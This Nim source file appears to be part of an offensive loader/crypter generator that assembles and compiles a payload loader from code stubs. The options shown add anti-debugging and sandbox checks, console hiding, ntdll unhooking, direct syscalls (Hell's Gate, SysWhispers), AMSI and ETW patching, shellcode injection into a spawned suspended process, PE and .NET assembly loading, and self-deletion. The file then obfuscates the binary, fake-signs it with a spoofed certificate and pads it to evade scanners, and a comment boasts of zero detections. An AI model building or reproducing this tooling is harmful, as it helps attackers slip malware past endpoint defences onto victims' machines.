proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    return true

proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    return true

proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    NimMain()
    return true
"""

let DllCustomExportStub = """
proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
    NimMain()
    return true
"""

let DllStubRemoteInj = """
import dynlib
proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true

proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true

proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true
"""

let DllCustomExportStubRemoteInj = """
proc `FUNC_EXPORT`(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID): BOOL {.stdcall,exportc, dynlib.} =
    return true
"""

let APIHideStub = """

#[ Crappy behaviours here , maybe I'll fix it later ]
when defined(DInvoke):
    const
      USER32_DLL* = obf("user32.dll")

    type
      GetConsoleWindow_t* = proc (): HANDLE {.stdcall.}
      ShowWindow_t* = proc (hwnd: HANDLE, nCmdShow: int): BOOL {.stdcall.}
  
    const
      GetConsoleWindow_OBF * = obf("GetConsoleWindow")
      ShowWindow_OBF * = obf("ShowWindow")
  
    var MyGetConsoleWindow*: GetConsoleWindow_t
    var MyShowWindow*: ShowWindow_t

    MyGetConsoleWindow = cast[GetConsoleWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetConsoleWindow_OBF, 0, FALSE)))

    MyShowWindow = cast[ShowWindow_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(USER32_DLL, TRUE)), ShowWindow_OBF, 0, FALSE)))


    var hwnd: HANDLE = MyGetConsoleWindow()
    var hidden: bool = MyShowWindow(hwnd, SW_HIDE)
    when defined(verbose):
        echo "Hidden:", hidden

else:]#
var hwnd: HANDLE
hwnd = GetConsoleWindow()
ShowWindow(hwnd, SW_HIDE)
"""

let SleepyCryptLoopExecute = """
SleepyCryptLoop(10000)
"""

let NotepadProcIDStub * = fmt"""
import osproc
# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
let tProcess = startProcess(obf("{customspawnprocess}"))
tProcess.suspend() # That's handy!
tProcess.close()

when defined(verbose):
    echo obf("[*] Target Process: "), tProcess.processID
var remoteProcID = DWORD(tProcess.processID)

"""

proc getRandStub (): string =
  var randName: string = rndStr(rand(10..25))
  var randValues: string = rndStr(rand(50..500))
  let randstub = fmt"""

var {randName}: string = obf("{randValues}")

"""
  return randstub

let BeingDebugged * = fmt"""
import AntiDebug
if(AmIDebugged()):
  quit()
"""

var stub = Cryptstub1
if (not noDInvoke):
    stub.add(DInvokeBaseStub)

if(pump):
    # makes no sense to import strenc when strings should be visible in the binary.
    stub =  stub.replace("import strenc", "")
    for m in pumpargs:
        if(m == "words"):
            echo "[*] Adding words"
            stub.add(genEnglishwords(rand(4750..7800)))
        if (m == "reputation"):
            echo "[*] Adding reputation"
            stub.add(genTrustedwords(rand(3500..6200)))

if(antidebug):
    stub.add(BeingDebugged)

stub.add(getRandStub())

if(sandbox):
    if (not noDInvoke): stub.add(DInvokeSandBoxStub)
    for m in sandboxchecks:
        if(m == "Domain"):
            stub.add(DomainCheckStub)
            stub.add(DomainCheckStub1)
        if (m == "DiskSpace"):
            stub.add(DiskSpaceStub)
        if (m == "DomainJoined"):
            stub.add(DomainJoinStub)
        if (m == "MemorySpace"):
            stub.add(MemorySpaceStub)
        if (m == "Emulated"):
            stub.add(VirtualAlloxExNumaCheckStub)
        if (m == "WindowChanges"):
            stub.add(WindowChangeStub)
if (apihide):
    stub.add(APIHideStub)

if(gosleep):
    stub.add(SleepStubFirst)
    stub.add(SleepStubSecond)

stub.add(getRandStub())

if (getfreshstub):
    stub.add(GetSyscallStub)
    stub.add(NtProtectSyscallStart)

if (syswhispers):
    if(jump):
        stub.add(WhispersJumpStub)
    else:
        stub.add(WhispersStub)

stub.add(getRandStub())

if(unhook):
    if(hellsgate):
        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
        stub.add(Winimleanstub)
        stub.add(WinLeanGetCurrentProcStub)
        stub.add(HellsgateStub)
        stub.add(HellsgateProtectDelegate)
        stub.add(HellsgateWriteDelegate)
        stub.add(HellsgateNtCloseDelegate)
    elif(getfreshstub):
        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
        stub.add(Winimleanstub)
        stub.add(NtProtectVirtualMemoryDelegate)
        stub.add(NtWriteVirtualMemoryDelegate)
        stub.add(NtCloseDelegate)
        stub.add(UnhookSyscalls)
    elif(syswhispers):
        if (not noDInvoke): stub.add(DInvokeUnhookStubs)
        stub.add(Winimleanstub)
    stub.add(UnhookNtdllStub)
else:
    if(hellsgate):
        stub.add(WinLeanGetCurrentProcStub)
        stub.add(HellsgateStub)
        stub.add(HellsgateProtectDelegate)
        stub.add(HellsgateWriteDelegate)
        stub.add(HellsgateNtCloseDelegate)
    elif(getfreshstub):
        stub.add(NtProtectVirtualMemoryDelegate)
        stub.add(NtWriteVirtualMemoryDelegate)
stub.add(getRandStub())
# Only decrypt when sandbox Checks/Unhooking/Sleep is done
stub.add(getRandStub())
stub.add(Cryptstub2)
stub.add(getRandStub())
stub.add(getRandStub())
stub.add(Cryptstub3)
stub.add(getRandStub())
stub.add(getRandStub())

if (AMSI or AMSIProviderPatch or ETW or peload or (localinject == false) or selfdelete):
    if (not noDInvoke): stub.add(DInvokeLoadLibraryAGetProcAddress)
    if (selfdelete):
        if (not noDInvoke): stub.add(DInvokeSelfDeleteStubs)
        stub.add(FileDeleteStub)
stub.add(getRandStub())
if (localinject):
    if (AMSI):
        stub.add(AMSIStub)
    elif(AmsiProviderPatch):
        stub.add(AMSIProviderPatchStub)
    if (ETW):
        if (COMVARETW):
            stub.add(ETWCOMVARStub)
        else:
            stub.add(ETWPatchStub)
stub.add(getRandStub())
if (remoteETWpatch or remoteAMSIpatch):
    stub.add(RemoteModuleHandleStub)
    if (gosleep == false):
        stub.add(SleepStubFirst)
    if (unhook == false):
        if (not noDInvoke): stub.add(DInvokeGetModuleHandleADelegate)
stub.add(getRandStub())
if(dll_out):
    if (processname == ""):
        stub.add(DllStub)
        for f in dllexportfunctions:
            stub.add(DllCustomExportStub)
            stub = stub.replace("FUNC_EXPORT", f)
    else:
        stub.add(DllStubRemoteInj)
        for f in dllexportfunctions:
            stub.add(DllCustomExportStubRemoteInj)
            stub = stub.replace("FUNC_EXPORT", f)
stub.add(getRandStub())
if (peload):
    if (localinject):
        if (embeddedArguments):
            stub.add(PatchargsFuncs)
        if (hellsgate):
            stub.add(HellsgateAllocDelegate)
            stub.add(PELoadStub)
        elif(getfreshstub):
            stub.add(NtAllocateVirtualMemoryDelegate)
            stub.add(ProtectWriteAllocSyscalls)
            stub.add(PELoadStub)
        elif(syswhispers):
            stub.add(PELoadStub)
        stub.add(getRandStub())
    else:   
        stub.add(RemoteProcImportStub)
        if (hellsgate):
            stub.add(HellsgateNtOpenProcessDelegate)
            stub.add(HellsgateAllocDelegate)
            stub.add(HellsgateNtCreateThreadExDelegate)
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
            stub.add(ShellcoderemoteinjectStub)
            stub.add(getRandStub())
            stub.add(getRandStub())

if (shellcode):
    if (localinject):
        if (getfreshstub):
            if (localCreateThread):
                stub.add(NtCreateThreadExDelegate)
            stub.add(LocalInjectDelegates)
        if (hellsgate):
            if (localCreateThread):
                stub.add(HellsgateNtCreateThreadExDelegate)
            stub.add(HellsgateAllocDelegate)
        stub.add(getRandStub())
        stub.add(LocalInjectStub)
        stub.add(getRandStub())
    else:
        stub.add(Winimleanstub)
        stub.add(getRandStub())
        if (getfreshstub):
            stub.add(RemoteProcImportStub)
        if (hellsgate):
            stub.add(HellsgateNtOpenProcessDelegate)
            stub.add(HellsgateAllocDelegate)
            stub.add(HellsgateNtCreateThreadExDelegate)
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        elif(syswhispers):
            if (processname == ""):
                stub.add(getRandStub())
                stub.add(NotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
        elif (getfreshstub):
            stub.add(RemoteInjectDelegates)
            stub.add(getRandStub())
            if (processname == ""):
                stub.add(NotepadProcIDStub)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchAMSIStub)
                stub.add(getRandStub())
                stub.add(ShellcoderemoteinjectStub_notepad)
            else:
                stub.add(ShellcoderemoteinjectStub_customprocfirst)
                stub.add(ShellcoderemoteinjectStub_customprocseccond)
                stub.add(ShellcoderemoteinjectStub_customprocID)
                if (remoteETWpatch):
                    stub.add(RemoteLoadNTDLLStub)
                    stub.add(getRandStub())
                    stub.add(RemotePatchETWStub)
                if (remoteAMSIpatch):
                    stub.add(RemoteLoadAMSIStub)
                    stub.add(RemotePatchAMSIStub)
                stub.add(ShellcoderemoteinjectStub_customprocthird)
            
        stub.add(ShellcoderemoteinjectStub)
        stub.add(getRandStub())

if (csharp):
    stub.add(AssemblyImports)
    stub.add(getRandStub())
    if (noArgs):
        stub.add(LoadAssemblyStub)
        stub.add(getRandStub())
        stub.add(LoadAssemblyStubNoArgs)
        stub.add(getRandStub())
    else:
        stub.add(getRandStub())
        stub.add(LoadAssemblyStub)
        stub.add(getRandStub())
        stub.add(LoadAssemblyStubArgs)
        stub.add(getRandStub())

if (pump):
    for m in pumpargs:
        if(m == "words"):
            stub.add(genEnglishwords(rand(4750..7800)))

if (sleepycrypt):
    stub.add(LocalInjectGetSyscallStubSleepStub)
    #stub.add(SleepyCryptLoopExecute)

if (debugMode):
    stub = stub.replace("import strenc", "")

writeFile("Loader.nim", stub)
echo "Written Loader.nim, compiling -> \n\n"


# --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
# This is only for the best size: -d:danger -d:strip --opt:size --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
# --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality

var basicCompileFlags: string = ""


if (hellsgate):
    echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
    discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")

if (llvm):
    echo "[+] Using LLVM-Obfuscator to compile"
    if system.hostOS == "linux":
        # Stolen from https://github.com/icyguider/Nimcrypt2/blob/main/nimcrypt.nim#L710
        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
        if "Obfuscator-LLVM" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
            quit()
    when system.hostOS == "windows":
        var result = execCmdEx("clang -v")
        if "Obfuscator-LLVM" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --opt:size --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
            quit()
elif system.hostOS == "windows":
    # there's a bug in my modified denim, which makes "--" out of "-d" for the first argument when using multiple arguments, so only one can be accepted at the moment
    if (denim):
        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
    else:
        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
elif system.hostOS == "linux":
    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader

if(hellsgate):
    basicCompileFlags.add("-d:Hellsgate ")
elif(getfreshstub):
    basicCompileFlags.add("-d:GetSyscallStub ")
elif(syswhispers):
    basicCompileFlags.add("-d:SysWhispers ")

if (verbose):
    basicCompileFlags.add("-d:verbose ")

if embeddedArguments:
    basicCompileFlags.add("-d:args ")

if (big):
    basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")

if (noRES):
    if (dll_out):
        when system.hostOS == "windows":
            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
        else:
            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/dll.o ")    
    else:
        when system.hostOS == "windows":
            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\cmd.o ")
        else:
            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/cmd.o ")

if(fluctuate):
    basicCompileFlags.add(fmt"-d:Fluctuate ")

if (compileX86):
    basicCompileFlags.add("--cpu:i386 ")

if not noDInvoke:
    basicCompileFlags.add("-d:DInvoke ")

if localCreateThread:
    basicCompileFlags.add("-d:LocalCreateThread ")

if (dll_out):
    if (processname == ""):
        basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
    else:
        basicCompileFlags.add("--app=lib -d:lib_only ")
else:
    if(hide):
        basicCompileFlags.add("--app=gui ")
    else:
        basicCompileFlags.add("--app=console ")
    if (reflective):
        basicCompileFlags.add("--app=gui --passL:-Wl,--dynamicbase,--export-all-symbols ")

if((syswhispers != true) and (hellsgate != true)):
    if system.hostOS == "windows":
        basicCompileFlags.add("--passc=-flto --passl=-flto ")

# for e.g. CNA Scripts
when system.hostOS == "windows":
    if (denim):
        basicCompileFlags.add(fmt"-p:""{packerPath}""")
    else:
        basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
else:
    basicCompileFlags.add(fmt"-p:'{packerPath}' ")

if(denim == false):
    basicCompileFlags.add(fmt"--out={outfile} Loader.nim")

if debugMode:
    basicCompileFlags = basicCompileFlags.replace("-d:release", "-d:debug")
    basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
    basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")

echo "Compile command:"
echo basicCompileFlags
echo "\n\n"

when system.hostOS == "windows":
    if (denim):
        var exist: bool = fileExists(".\\denim\\denim.exe")
        # cause some compile problems
        basicCompileFlags = basicCompileFlags.replace("--passc=-flto --passl=-flto ", "")
        if (exist):
            # An additional whitespace at the end causes an compiler error here, so we'll remove it
            basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
            stub = stub.replace("import strenc", "")
            writeFile("Loader.nim", stub)
            discard os.execShellCmd(fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
            let msg = fmt"[!] Encrypted file saved to {outfile}"
            echo "\n" & msg
            if(replace):
                var randstring: string = rndStr(2)
                echo fmt"[!] ---> replacing nim with {randstring} "
                discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
            quit()
elif system.hostOS == "linux":
    if (denim):
        echo "No Denim support for Linux systems, sorry!"

discard os.execShellCmd(basicCompileFlags)

proc replaceList () =
    var words: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = "Dicts\\toReplace.txt"
    else:
        dictionary = "Dicts/toReplace.txt"
    for line in lines dictionary:
      words.add(line)
    var length: int = len(words) - 1
    for i in 0..length:
        var wordLength: int = len(words[i])
        var replacelength = wordLength - 1
        #echo words[i]
        #echo wordLength
        var randstring: string = rndStr(replacelength)
        echo fmt"[!] ---> replacing {words[i]} with {randstring} "
        var command: string = fmt"nimgrep ""{words[i]}"""
        command.add(fmt" --replace {randstring} {outfile}")
        echo command
        discard exec_cmd_ex(command)

if(replace):
    replaceList()
let msg = fmt"[!] Encrypted file saved to {outfile}"
echo "\n" & msg

if (callobfs):
    when system.hostOS == "windows":
        var outfileonlyname = outfile.replace(packerPath, "")
        echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
        echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
        echo "\r\n"
        echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
        outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
    else:
        echo "Only usable from a Windows OS, sorry!"

if (sign):
    echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
    echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
    if system.hostOS == "linux":
        if(dll_out):
            discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed.dll")
        else:
            discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed.exe")
    when system.hostOS == "windows":
        if(dll_out):
            discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed.dll")
        else:
            discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed.exe")
    if (dll_out):
        outfile.add(".Signed.dll")
    else:
        outfile.add(".Signed.exe")

if (pump):
    for m in pumpargs:
        if(m == "size"):

            var pumpexecutable = readFile(outfile)

            var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]

            proc pumpHard(number: int): seq[byte] =
              var pump: seq[byte] = pumpzero
              for i in 0 ..< number:
                pump.add(pumpzero)
              return pump

            var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 

            var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)

            pumpsequence.add(pumped)


            writeFile(fmt"{outfile}",pumpsequence)